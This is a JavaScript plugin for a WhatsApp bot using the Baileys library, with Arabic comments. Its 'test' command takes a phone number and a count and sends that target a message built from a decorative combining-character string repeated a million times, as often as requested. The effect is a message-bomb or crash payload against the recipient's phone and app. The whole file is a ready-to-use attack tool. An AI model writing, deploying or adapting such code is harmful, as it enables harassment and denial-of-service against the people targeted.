import pkg from '@whiskeysockets/baileys';
const { WAConnection, MessageType } = pkg;

let handler = async (m, { conn, text, command }) => {
    if (command == 'test') {
        // تقسيم النص إلى الرقم وعدد الرسائل
        let [number, count] = text.trim().split(/\s+/);
        if (!number || !count) throw '*مثال* :\n*.focus* 1234567890 3';
        
        // التأكد من أن number هو رقم هاتف صحيح وأن count عدد صحيح
        if (!/^\d+$/.test(number)) throw '*خطأ* :\n*الرقم المدخل غير صحيح*';
        if (!/^\d+$/.test(count) || count <= 0) throw '*خطأ* :\n*العدد المدخل غير صحيح*';
        
        count = parseInt(count);

        // الرسالة التلقائية المحددة
        let message = '✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ';
        // تكرار الرسالة مليون مرة
        let repeatedMessage = message.repeat(1000000);

        // إرسال الرسالة بعدد المرات المطلوبة
        for (let i = 1; i <= count; i++) {
            await conn.sendMessage(number + '@s.whatsapp.net', { text: `${i}. ${repeatedMessage}` });
        }

        m.reply(`تم إرسال الرسالة ${count} مرة إلى ${number}`);
    }
}

handler.command = handler.help = ['test'];
handler.tags = ['tools'];
export default handler;